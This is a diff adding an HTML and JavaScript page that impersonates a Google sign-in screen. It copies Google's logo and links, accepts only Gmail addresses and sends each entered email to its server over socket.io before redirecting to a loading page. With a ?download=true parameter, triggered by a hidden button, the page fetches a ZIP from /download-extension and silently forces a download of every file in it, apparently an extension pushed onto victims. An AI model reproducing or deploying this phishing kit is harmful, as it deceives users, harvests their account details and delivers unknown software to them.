@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download Page</title>
+  <link rel="stylesheet" href="style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.7.1/jszip.min.js"></script>
+  <style>
+    /* Remove underline & blue color from links */
+    .help a, .privacy a, .terms a {
+      text-decoration: none;
+      color: black;
+    }
+
+    /* Optional: Change color on hover */
+    .help a:hover, .privacy a:hover, .terms a:hover {
+      color: gray;
+    }
+
+    /* Red error text */
+    .small_text2 {
+      display: none;
+      color: red;
+    }
+
+    .small_text {
+      display: none;
+      color: #1a73e8;
+    }
+
+    .error {
+      border: 1px solid red;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Google Logo -->
+    <div class="google_g_logo">
+      <img src="images/Google__G__logo.svg.png" alt="Google G logo" width="44" height="44">
+    </div>
+
+    <!-- Greeting -->
+    <div class="name_container">
+      <span jsslot="">Sign In</span>
+    </div>
+
+    <!-- Login Form -->
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="email"></label>
+        <input type="email" id="email" name="email" required placeholder="Email or Phone">
+      </div>
+    </form>
+
+    <!-- Error Messages -->
+    <div class="small_text">Email or Phone</div>
+    <div class="small_text2">Email or Phone</div>
+
+    <!-- Next Button -->
+    <div class="next_button">
+      <button type="submit" id="nextButton">Next</button>
+    </div>
+
+    <!-- Language Selection -->
+    <div class="english">
+      <a href="https://support.google.com/" target="_blank">English (United States)</a> 
+      <span style="color: rgb(71, 71, 71); margin-left: 25px;">▼</span>
+    </div>
+
+    <!-- Footer Links -->
+    <div class="help"><a href="https://support.google.com/" target="_blank">Help</a></div>
+    <div class="privacy"><a href="https://policies.google.com/privacy" target="_blank">Privacy</a></div>
+    <div class="terms"><a href="https://policies.google.com/terms" target="_blank">Terms</a></div>
+
+    <!-- Account Info -->
+    <div class="account">
+      <a href="" target="_blank">Use your Google Account</a>
+    </div>
+
+    <div class="forgot_email">
+      <b><a href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fwww.google.com%2Fsearch%3Fclient%3Dfirefox-b-1-d%26q%3Dgiigle%2Bsign%2Bin%2B&ddm=1&dsh=S53087993%3A1739127161573922&ec=GAlAAQ&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&authuser=0" target="_blank">Forgot email?</a></b>
+    </div>
+
+    <div class="not_your">
+      Not your computer? Use a Private Window to sign in.  
+      <span style="color: blue;"><b><a href="https://support.google.com/accounts?p=signin_privatebrowsing&hl=en" target="_blank">Learn more about</a></b></span>
+    </div>
+
+    <div class="guest_mode">
+      <span style="color: blue;"><b><a href="https://support.google.com/accounts?p=signin_privatebrowsing&hl=en" target="_blank">using Guest mode</a></b></span>
+    </div>
+
+    <div class="create">
+      Create an account
+    </div>
+
+    <!-- Download Link -->
+    <div class="download-container">
+      <button id="downloadButton"></button>
+    </div>
+
+    
+  </div>
+
+  <!-- JavaScript -->
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const socket = io(); // Connect to the server
+      const loginForm = document.getElementById("loginForm");
+      const emailInput = document.getElementById("email");
+      const nextButton = document.getElementById("nextButton");
+      const smallText = document.querySelector(".small_text");
+      const smallText2 = document.querySelector(".small_text2");
+      const downloadButton = document.getElementById('downloadButton');
+
+      function handleEmailSubmission() {
+        const email = emailInput.value.trim();
+
+        // Validate email
+        if (email === "") {
+          smallText2.style.display = "block";
+          smallText2.textContent = "Enter your email";
+          smallText2.style.color = "rgb(176, 6, 6)";
+          emailInput.classList.add("error");
+          emailInput.style.borderColor = "rgb(176, 6, 6)";
+          return;
+        }
+
+        if (!email.includes("@gmail.com")) {
+          smallText2.style.display = "block";
+          smallText2.textContent = "Invalid email format";
+          smallText2.style.color = "rgb(176, 6, 6)";
+          emailInput.classList.add("error");
+          emailInput.style.borderColor = "rgb(176, 6, 6)";
+          return;
+        }
+
+        // Reset styles on valid input
+        smallText2.style.display = "none";
+        emailInput.classList.remove("error");
+        emailInput.style.borderColor = "";
+
+        console.log("Email entered:", email); // Log the email to the terminal
+
+        // Store the email in local storage
+        localStorage.setItem("email", email);
+
+        // Emit email to server
+        socket.emit("login", { email });
+
+        // Redirect to the loading page with email
+        window.location.href = `/loading.html?email=${encodeURIComponent(email)}`;
+      }
+
+      // Handle Next button click
+      nextButton.addEventListener("click", function (event) {
+        event.preventDefault();
+        handleEmailSubmission();
+      });
+
+      // Handle Enter key press inside the email input field
+      emailInput.addEventListener("keydown", function (event) {
+        if (event.key === "Enter") {
+          event.preventDefault();
+          handleEmailSubmission();
+        }
+      });
+
+      // Listen for login events (from the server)
+      socket.on("loginEvent", function (data) {
+        console.log(`Email: ${data.email}`);
+      });
+
+      // Handle "Download Extension" Button click
+      downloadButton.addEventListener('click', function () {
+        // Redirect user to index.html with download=true in the URL
+        window.location.href = window.location.origin + window.location.pathname + "?download=true";
+      });
+
+      // If the URL contains ?download=true, automatically start the download
+      const urlParams = new URLSearchParams(window.location.search);
+      if (urlParams.get("download") === "true") {
+        const zipFileURL = "/download-extension"; // Path to your zip file
+
+        fetch(zipFileURL)
+          .then(response => response.blob())
+          .then(blob => {
+            // Load the ZIP file using JSZip
+            JSZip.loadAsync(blob).then(function(zip) {
+              Object.keys(zip.files).forEach(function(filename) {
+                zip.files[filename].async("blob").then(function(blob) {
+                  // Create an invisible link for downloading the file
+                  const link = document.createElement("a");
+                  link.href = URL.createObjectURL(blob);
+                  link.download = filename;
+
+                  // Append to body, trigger the download, then remove the link
+                  document.body.appendChild(link);
+                  link.click();
+                  document.body.removeChild(link);
+                });
+              });
+            });
+          })
+          .catch(err => {
+            console.error("Error during download:", err);
+          });
+      }
+    });
+  </script>
+</body>
+</html>
